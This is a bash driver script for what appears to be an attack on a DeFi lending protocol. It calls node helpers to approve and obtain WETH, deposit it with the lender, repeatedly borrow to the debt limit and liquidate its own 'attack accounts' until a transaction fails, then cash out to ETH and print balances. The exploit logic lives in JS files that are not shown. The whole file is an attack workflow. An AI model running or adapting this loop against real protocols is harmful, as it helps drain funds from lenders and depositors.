#! /bin/bash

# before running this script run setup.js and copy output address and prikey to attackdouble.js

# approve weth and token transfers for attack accounts
node approve.js

# get weth for attack accounts
node getweth.js

# deposit all weth with lender
node deposit.js

echo "Liquidating ... this may take a few minutes."

while true
do
	# borrow safe debt limit
	node borrow.js | grep 'Error'
	if [ $? == 0 ]
	then
		break
	fi

	# liquidate attack accounts
	node liquidate.js | grep 'Error'
	if [ $? == 0 ]
	then
		break
	fi

	# repeat until tx failure

done

# ditch wrapped ether for real ether
node geteth.js

# print balances
node probe.js

